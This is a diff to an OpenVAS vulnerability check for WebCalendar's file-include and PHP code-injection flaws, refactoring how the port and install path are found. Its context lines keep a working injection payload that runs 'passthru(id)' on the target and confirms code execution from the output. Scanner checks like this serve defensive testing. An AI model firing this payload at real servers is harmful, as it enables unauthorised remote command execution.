@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_WebCalendar_53207.nasl 11072 2018-08-21 14:38:15Z asteins $
+# $Id: gb_WebCalendar_53207.nasl 11651 2018-09-27 11:53:00Z asteins $
 #
 # WebCalendar Local File Include and PHP code Injection Vulnerabilities
 #
@@ -30,7 +30,7 @@ if (description)
   script_oid("1.3.6.1.4.1.25623.1.0.103476");
   script_bugtraq_id(53207);
   script_cve_id("CVE-2012-1495", "CVE-2012-1496");
-  script_version("$Revision: 11072 $");
+  script_version("$Revision: 11651 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
   script_name("WebCalendar Local File Include and PHP code Injection Vulnerabilities");
@@ -39,7 +39,7 @@ if (description)
   script_xref(name:"URL", value:"http://sourceforge.net/projects/webcalendar/?source=directory");
   script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522460");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-21 16:38:15 +0200 (Tue, 21 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-27 13:53:00 +0200 (Thu, 27 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-04-25 09:40:31 +0200 (Wed, 25 Apr 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -64,12 +64,19 @@ context of the affected application. Other attacks are also possible.");
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 include("version_func.inc");
 
-port = get_http_port(default:80);
-if(!can_host_php(port:port))exit(0);
+CPE = 'cpe:/a:webcalendar:webcalendar';
 
-if(!dir = get_dir_from_kb(port:port,app:"webcalendar"))exit(0);
+if(!port = get_app_port(cpe:CPE))
+  exit(0);
+
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
+
+if(dir == "/")
+  dir = "";
 
 phpcode = '*/print(____);passthru(id);die;';
 payload = 'app_settings=1&form_user_inc=user.php&form_single_user_login=' + phpcode;
@@ -101,8 +108,6 @@ if(http_vuln_check(port:port,url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
   security_message(port:port);
   exit(0);
 
-} else {
-  exit(99);
 }
 
-exit(0);
+exit(99);
